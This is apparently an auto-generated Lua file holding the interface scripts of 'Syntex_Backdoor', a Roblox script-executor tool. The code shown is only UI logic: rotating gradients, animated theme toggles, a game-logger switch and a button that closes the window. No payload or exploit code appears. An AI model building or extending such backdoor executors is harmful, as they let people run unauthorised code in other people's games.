-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.UIGradient.LocalScript
local function C_ee()
	local script = G2L["ee"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_ee);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.galaxyThemeGradient.LocalScript
local function C_f1()
	local script = G2L["f1"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_f1);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.lunarThemeGradient.LocalScript
local function C_f3()
	local script = G2L["f3"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_f3);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.UIGradient.LocalScript
local function C_fd()
	local script = G2L["fd"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_fd);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.anim
local function C_105()
	local script = G2L["105"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = true

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			UI.LOGO.Visible = false
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			UI.LOGO.Visible = true
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_105);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton.anim
local function C_111()
	local script = G2L["111"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = false

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			UI.mainContainer.Home.UIGradient.Enabled = true
			UI.mainContainer.Executor.ideContainer.UIGradient.Enabled = true
			UI.mainContainer.ScriptHub.UIGradient.Enabled = true
			UI.mainContainer.Settings.UIGradient.Enabled = true
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			UI.mainContainer.Home.UIGradient.Enabled = false
			UI.mainContainer.Executor.ideContainer.UIGradient.Enabled = false
			UI.mainContainer.ScriptHub.UIGradient.Enabled = false
			UI.mainContainer.Settings.UIGradient.Enabled = false
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_111);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.galaxyTheme.TextButton.anim
local function C_11d()
	local script = G2L["11d"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = true

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			UI.mainContainer.Home.galaxyThemeGradient.Enabled = true
			UI.mainContainer.Executor.ideContainer.galaxyThemeGradient.Enabled = true
			UI.mainContainer.ScriptHub.galaxyThemeGradient.Enabled = true
			UI.mainContainer.Settings.galaxyThemeGradient.Enabled = true
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			UI.mainContainer.Home.galaxyThemeGradient.Enabled = false
			UI.mainContainer.Executor.ideContainer.galaxyThemeGradient.Enabled = false
			UI.mainContainer.ScriptHub.galaxyThemeGradient.Enabled = false
			UI.mainContainer.Settings.galaxyThemeGradient.Enabled = false
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_11d);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.lunarTheme.TextButton.anim
local function C_128()
	local script = G2L["128"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = true

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			UI.mainContainer.Home.lunarThemeGradient.Enabled = true
			UI.mainContainer.Executor.ideContainer.lunarThemeGradient.Enabled = true
			UI.mainContainer.ScriptHub.lunarThemeGradient.Enabled = true
			UI.mainContainer.Settings.lunarThemeGradient.Enabled = true
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			UI.mainContainer.Home.lunarThemeGradient.Enabled = false
			UI.mainContainer.Executor.ideContainer.lunarThemeGradient.Enabled = false
			UI.mainContainer.ScriptHub.lunarThemeGradient.Enabled = false
			UI.mainContainer.Settings.lunarThemeGradient.Enabled = false
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_128);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.gameLogger.TextButton.anim
local function C_133()
	local script = G2L["133"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = false

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			script.Parent.enb.Value = true
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			script.Parent.enb.Value = false
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_133);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.KillExecutor.TextButton.LocalScript
local function C_141()
	local script = G2L["141"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_141);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.anim
local function C_14a()
	local script = G2L["14a"];
	local TweenService = game:GetService("TweenService")
	local button = script.Parent
	local frame = button:WaitForChild("Frame")
	local originalColor = Color3.fromRGB(223, 0, 0)
	local targetColor = Color3.new(0, 1, 0)
	local UI = script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.UI

	local tweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local goalUp = {Position = UDim2.new(0.653, 0, 0.231, 0)}
	local goalDown = {Position = UDim2.new(0.111, 0, 0.231, 0)}

	local tweenUp = TweenService:Create(frame, tweenInfo, goalUp)
	local tweenDown = TweenService:Create(frame, tweenInfo, goalDown)

	local colorTweenInfo = TweenInfo.new(
		0.5,
		Enum.EasingStyle.Quad,
		Enum.EasingDirection.Out
	)

	local colorTweenToGreen = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = targetColor})
	local colorTweenToOriginal = TweenService:Create(button, colorTweenInfo, {BackgroundColor3 = originalColor})

	local isMovingUp = false

	button.MouseButton1Click:Connect(function()
		if isMovingUp then
			script.Parent.Parent.Parent.Parent.Parent.Parent.Executor.ideContainer.ideScroll.H_Handler.Enabled = true
			script.Parent.Parent.Parent.Parent.Parent.Parent.Executor.ideContainer.ideScroll.ide.TextTransparency = 1
			script.Parent.Parent.Parent.Parent.Parent.Parent.Executor.ideContainer.ideScroll.ide.Text = ""
			tweenUp:Play()
			colorTweenToGreen:Play()
		else
			script.Parent.Parent.Parent.Parent.Parent.Parent.Executor.ideContainer.ideScroll.H_Handler.Enabled = false
			script.Parent.Parent.Parent.Parent.Parent.Parent.Executor.ideContainer.ideScroll.ide.TextTransparency = 0
			tweenDown:Play()
			colorTweenToOriginal:Play()
		end
		isMovingUp = not isMovingUp
	end)
end;
task.spawn(C_14a);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.galaxyThemeGradient.LocalScript
local function C_151()
	local script = G2L["151"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_151);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.lunarThemeGradient.LocalScript
local function C_153()
	local script = G2L["153"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_153);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.UIGradient.LocalScript
local function C_15f()
	local script = G2L["15f"];
	while true do
		wait(0.01)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_15f);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.UIGradient.LocalScript
local function C_164()
	local script = G2L["164"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_164);

return G2L["1"], require;